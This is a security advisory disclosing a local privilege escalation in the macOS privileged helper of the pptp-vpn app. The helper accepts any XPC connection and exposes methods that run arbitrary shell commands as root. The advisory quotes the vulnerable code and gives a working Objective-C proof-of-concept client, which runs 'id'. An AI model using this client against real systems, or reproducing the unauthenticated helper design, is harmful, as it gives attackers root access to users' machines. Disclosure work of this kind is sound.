# Privileged helper accepts unauthenticated XPC connections and executes arbitrary shell commands

## Summary

The `com.cxy.PPTPVPN.HelpTool` privileged helper (macOS) accepts any incoming NSXPCConnection without verifying the client identity. The helper exports an interface that allows callers to run arbitrary shell commands using `NSTask`, `system()` and `NSAppleScript`. A local attacker who can connect to the helper’s Mach service (`com.cxy.PPTPVPN.HelpTool`) can execute commands with the helper’s privileges (root). This enables local privilege escalation and arbitrary code execution as the helper user.


## Technical Details

The root cause of this vulnerability lies in the listener(shouldAcceptNewConnection:) this unconditionally accepts all incoming XPC connections by returning YES (or true), without verifying whether the sender is the legitimate main application. This allows any application on the system including malicious ones to interact with the helper.


This implementation has no verification. 
```objc
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
    assert(listener == self.listener);
#pragma unused(listener)
    assert(newConnection != nil);
    
    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
    newConnection.exportedObject = self;
    [newConnection resume];
    
    return YES;
}
```

The exported protocol [HelperToolProtocol.h](https://github.com/iHongRen/pptp-vpn/blob/6449cd6bb45016e7af59f4925d35ef080572e94c/HelpTool/HelperTool.h) exposes the following methods that accept arbitrary input and are executed by the helper:

```objc
- (void)executeShellPath:(NSString*)path arguments:(NSArray*)args withReply:(void(^)(NSError *error,NSString *outputString))reply;
- (void)executeShellCommand:(NSString*)command withReply:(void(^)(NSDictionary * errorInfo))reply;
- (void)executeShellSystemCommand:(NSString *)command withReply:(void (^)(NSInteger))reply;
```


https://github.com/iHongRen/pptp-vpn/blob/6449cd6bb45016e7af59f4925d35ef080572e94c/HelpTool/HelperTool.m - L54 - 95
```objc

#pragma mark - protocol
- (void)executeShellPath:(NSString*)path arguments:(NSArray*)args withReply:(void(^)(NSError *error, NSString *outputString))reply {
    
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSTask *task = [NSTask new];
        task.launchPath = path;
        task.arguments = args;

        NSPipe *pipe = [NSPipe pipe];
        [task setStandardOutput:pipe];

        [task setStandardError:[NSPipe pipe]];
        NSError *err;
        [task launchAndReturnError:&err];
        [task waitUntilExit];

        NSData *outputData = [[task.standardOutput fileHandleForReading] readDataToEndOfFile];
        NSString *output = [[NSString alloc] initWithData:outputData encoding: NSUTF8StringEncoding];
        !reply?:reply(err, output);
    });
}


- (void)executeShellCommand:(NSString*)command withReply:(void(^)(NSDictionary * errorInfo))reply {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSString *script = [NSString stringWithFormat:@"do shell script \"%@\"",command];
        NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:script];
        NSDictionary *dicError = nil;
        [appleScript executeAndReturnError:&dicError];
        !reply?:reply(dicError);
    });
}

- (void)executeShellSystemCommand:(NSString *)command withReply:(void (^)(NSInteger))reply {

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        int res = system([command UTF8String]);
        !reply?:reply(res);
    });
}

@end
```

This allows any local process to gain root privileges by sending a crafted request.


## PoC

**PoC**

1. create a minimal Objective-C (or Swift) XPC client that connects to the Mach service `com.cxy.PPTPVPN.HelpTool`,
2. invoke the exported method `executeShellCommand:` or `executeShellPath:arguments:` with a command like `id` or `whoami` and observe privileged output.


```objc
#import <Foundation/Foundation.h>

// define protocol, or else we have to add - #import "HelperToolProtocol.h"
@protocol HelperToolProtocol

- (void)executeShellPath:(NSString *)path
               arguments:(NSArray *)args
              withReply:(void(^)(NSError *error, NSString *outputString))reply;

- (void)executeShellCommand:(NSString*)command
                  withReply:(void(^)(NSDictionary * errorInfo))reply;

- (void)executeShellSystemCommand:(NSString *)command
                        withReply:(void (^)(NSInteger))reply;

@end


int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.cxy.PPTPVPN.HelpTool" options:0];
        conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
        [conn resume];

        id proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError * _Nonnull error) {
            NSLog(@"XPC error: %@", error);
        }];

        // Call the method that executes a shell command on the helper side
        [proxy executeShellCommand:@"id" withReply:^(NSDictionary * errorInfo) {
            if (errorInfo) {
                NSLog(@"Error: %@", errorInfo);
            } else {
                NSLog(@"Command executed (check output / logs).");
            }
            exit(0);
        }];

        [[NSRunLoop currentRunLoop] run];
    }
    return 0;
}
```

## Impact

Local privilege escalation: an attacker with a local account can execute arbitrary commands as the privileged helper. This can lead to full system compromise.



## Info

Affected Version: v1.0.1

(Affected repository: `iHongRen/pptp-vpn`, [HelpTool](https://github.com/iHongRen/pptp-vpn/tree/6449cd6bb45016e7af59f4925d35ef080572e94c/HelpTool) component; [HelpTool.m](https://github.com/iHongRen/pptp-vpn/blob/6449cd6bb45016e7af59f4925d35ef080572e94c/HelpTool/HelperTool.m) CFBundleIdentifier: `com.cxy.PPTPVPN.HelpTool`.)
